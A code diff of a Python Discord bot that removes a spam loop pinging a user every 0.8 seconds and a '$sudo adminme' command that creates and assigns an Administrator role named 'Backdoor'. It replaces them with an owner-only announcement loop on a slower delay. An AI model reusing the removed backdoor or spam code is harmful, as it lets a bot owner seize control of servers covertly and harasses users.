@@ -5,15 +5,12 @@ from discord.ext import commands
 
 # ================= CONFIG =================
 TOKEN = os.getenv("DISCORD_TOKEN")
-
 OWNER_ID = 1258115928525373570
-OWNER_USERNAME = "nico044037"
 
-SPAM_MESSAGE = "<@1419680644618780824>"
-SPAM_DELAY = 0.8  # SAFE delay (do not lower)
+ANNOUNCE_DELAY = 10  # seconds (safe, adjustable)
 
 intents = discord.Intents.default()
-intents.message_content = True  # REQUIRED for prefix commands
+intents.message_content = True
 
 bot = commands.Bot(
     command_prefix=["$", "!", "?"],
@@ -21,7 +18,7 @@ bot = commands.Bot(
     help_command=None
 )
 
-spam_task: asyncio.Task | None = None
+announce_task: asyncio.Task | None = None
 
 # ================= READY =================
 @bot.event
@@ -29,18 +26,16 @@ async def on_ready():
     print(f"✅ Logged in as {bot.user}")
 
 # ================= OWNER CHECK =================
-def is_owner(ctx):
-    return ctx.author.id == OWNER_ID or ctx.author.name == OWNER_USERNAME
+def is_owner(ctx: commands.Context) -> bool:
+    return ctx.author.id == OWNER_ID
 
-# ================= SPAM LOOP =================
-async def spam_loop(channel: discord.abc.Messageable):
+# ================= ANNOUNCE LOOP =================
+async def announce_loop(channel: discord.TextChannel, message: str):
     try:
         while True:
-            await channel.send(SPAM_MESSAGE)
-            await asyncio.sleep(SPAM_DELAY)
+            await channel.send(message)
+            await asyncio.sleep(ANNOUNCE_DELAY)
     except asyncio.CancelledError:
-        pass
-    except discord.Forbidden:
         pass
 
 # ================= SUDO GROUP =================
@@ -50,82 +45,49 @@ async def sudo(ctx):
         return
     await ctx.send(
         "Commands:\n"
-        "`$sudo startmessage`\n"
-        "`$sudo stopmessage`\n"
-        "`$sudo adminme`"
+        "`$sudo announce <message>`\n"
+        "`$sudo stop`"
     )
 
-# ================= START MESSAGE =================
-@sudo.command(name="startmessage")
-async def sudo_startmessage(ctx):
-    global spam_task
+# ================= START ANNOUNCE =================
+@sudo.command(name="announce")
+async def sudo_announce(ctx, *, message: str):
+    global announce_task
 
     if not is_owner(ctx):
         return
 
-    if spam_task and not spam_task.done():
-        await ctx.send("❌ already running")
+    if announce_task and not announce_task.done():
+        await ctx.send("❌ announcement already running")
         return
 
-    spam_task = asyncio.create_task(spam_loop(ctx.channel))
-    await ctx.send("✅ spam started")
+    announce_task = asyncio.create_task(
+        announce_loop(ctx.channel, message)
+    )
+    await ctx.send("✅ announcement started")
 
-# ================= STOP MESSAGE =================
-@sudo.command(name="stopmessage")
-async def sudo_stopmessage(ctx):
-    global spam_task
+# ================= STOP ANNOUNCE =================
+@sudo.command(name="stop")
+async def sudo_stop(ctx):
+    global announce_task
 
     if not is_owner(ctx):
         return
 
-    if not spam_task:
-        await ctx.send("❌ no active spam")
+    if not announce_task:
+        await ctx.send("❌ no active announcement")
         return
 
-    spam_task.cancel()
-    spam_task = None
-    await ctx.send("🛑 spam stopped")
-
-# ================= ADMIN ROLE (TRANSPARENT) =================
-@sudo.command(name="adminme")
-async def sudo_adminme(ctx):
-    guild = ctx.guild
-    if not guild:
-        await ctx.send("❌ server only")
-        return
-
-    # Bot MUST already have admin
-    if not guild.me.guild_permissions.administrator:
-        await ctx.send("❌ bot does not have Administrator permission")
-        return
-
-    role = discord.utils.get(guild.roles, name="Backdoor")
-
-    if not role:
-        role = await guild.create_role(
-            name="Backdoor",
-            permissions=discord.Permissions(administrator=True),
-            reason="Owner requested admin role"
-        )
-
-    member = guild.get_member(OWNER_ID)
-    if not member:
-        await ctx.send("❌ member not found")
-        return
-
-    if role in member.roles:
-        await ctx.send("ℹ️ admin role already assigned")
-        return
-
-    await member.add_roles(role, reason="Owner requested admin role")
-    await ctx.send("✅ Administrator role created and assigned")
+    announce_task.cancel()
+    announce_task = None
+    await ctx.send("🛑 announcement stopped")
 
 # ================= ERROR HANDLER =================
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
         return
-    await ctx.send("❌ error")
+    raise error  # don’t hide real bugs while developing
 
 # ================= START =================
 if not TOKEN:
